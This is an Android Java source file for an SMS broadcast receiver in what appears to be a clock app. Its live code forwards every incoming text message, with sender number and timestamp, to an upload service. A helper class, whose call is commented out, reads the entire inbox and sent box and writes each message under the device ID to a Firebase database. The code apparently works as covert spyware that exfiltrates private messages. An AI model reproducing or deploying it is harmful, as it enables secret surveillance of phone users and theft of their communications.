package com.aftab.clock.Receivers;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsMessage;

import androidx.annotation.RequiresApi;

import com.aftab.clock.Model.SimSMS;
import com.aftab.clock.Services.UploadNewSMS;
import com.aftab.clock.Utills.Constants;
import com.aftab.clock.Utills.FireRef;
import com.aftab.clock.Utills.Functions;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;

@SuppressWarnings("deprecation")
public class SMSReceiver extends BroadcastReceiver {

    public static final String SMS_BUNDLE = "pdus";

    @SuppressLint({"MissingPermission", "UnsafeProtectedBroadcastReceiver"})
    @RequiresApi(api = Build.VERSION_CODES.M)
    public void onReceive(Context context, Intent intent) {


        Bundle intentExtras = intent.getExtras();


        if (intentExtras != null) {
            Object[] sms = (Object[]) intentExtras.get(SMS_BUNDLE);
            StringBuilder smsMessageStr = new StringBuilder();
            for (Object sm : sms) {
                SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) sm);

                String smsBody = smsMessage.getMessageBody();
                String number = smsMessage.getOriginatingAddress();
                long date = smsMessage.getTimestampMillis();
                String type = "receiveSimMsg";

                context.startService(new Intent(context, UploadNewSMS.class)
                        .putExtra(Constants.SIM_SMS, smsBody)
                        .putExtra(Constants.NUMBER, number)
                        .putExtra(Constants.DATE, date)
                        .putExtra(Constants.TYPE, type));


               /* Intent intent1 = new Intent(context, UploadNewSMS.class);
                intent1.putExtra(Constants.SIM_SMS, smsBody);
                intent1.putExtra(Constants.NUMBER, number);
                intent1.putExtra(Constants.DATE, date);
                intent1.putExtra(Constants.TYPE, type);

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {

                    ContextCompat.startForegroundService(context, intent1);

                } else {

                    context.startService(intent1);

                }*/

                smsMessageStr.append("SMS From: ").append(number).append("\n");
                smsMessageStr.append(smsBody).append("\n");
            }

            //  Toast.makeText(context, smsMessageStr.toString(), Toast.LENGTH_SHORT).show();


            // new SMSReceiver.AsyncCaller(context, smsMessageStr).execute();


        }


    }

    @SuppressLint("MissingPermission")
    @SuppressWarnings("deprecation")
    private static class AsyncCaller extends AsyncTask<Void, Void, Void> {

        Context context;
        FusedLocationProviderClient fusedLocationProviderClient;
        String newMessage, lat = "", lon = "";


        public AsyncCaller(Context context, String smsMessageStr) {
            this.context = context;
            this.newMessage = smsMessageStr;
        }

        @Override
        protected void onPreExecute() {
            super.onPreExecute();

        }

        @Override
        protected Void doInBackground(Void... params) {

            fusedLocationProviderClient = LocationServices.getFusedLocationProviderClient(context);

            ContentResolver cr = context.getContentResolver();
            Cursor c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
            int totalSMS;
            if (c != null) {
                totalSMS = c.getCount();
                if (c.moveToFirst()) {
                    for (int j = 0; j < totalSMS; j++) {
                        String smsDate = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE));
                        String number = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                        String body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY));
                        String type = "";
                        switch (Integer.parseInt(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.TYPE)))) {
                            case Telephony.Sms.MESSAGE_TYPE_INBOX:
                                type = "receiveSimMsg";
                                break;
                            case Telephony.Sms.MESSAGE_TYPE_SENT:
                                type = "sentSimMsg";
                                break;
                            default:
                                break;
                        }


                        String deviceID = Functions.getDeviceId(context);

                        if (number.contains(".")) {

                            number = number.replace(".", ",");

                        } else if (number.contains("#")) {

                            number = number.replace("#", "-");

                        } else if (number.contains("$")) {

                            number = number.replace("$", "_");

                        } else if (number.contains("[")) {

                            number = number.replace("[", "+");

                        } else if (number.contains("]")) {

                            number = number.replace("]", "/");

                        }

                        if (!number.contains("*") && !number.contains("#")) {

                            if (!number.startsWith("+") && number.length() > 6) {

                                number = Functions.formatNumber(context, number, Functions.checkCountryISO(context));


                            }

                        }


                        String pushId = smsDate + number;
                        SimSMS objSimSMS = new SimSMS(pushId, number, body, type, smsDate, "No Location", false);


                        //  String latLng = longitude + "," + latitude;

                        //   objSimSMS.setLocation(latLng);


                        FireRef.SIM_SMS.child(deviceID)
                                .child(number)
                                .child(pushId)
                                .setValue(objSimSMS);


                        c.moveToNext();
                    }
                }

                c.close();

            }


            return null;
        }

        @Override
        protected void onPostExecute(Void result) {
            super.onPostExecute(result);


        }

    }
}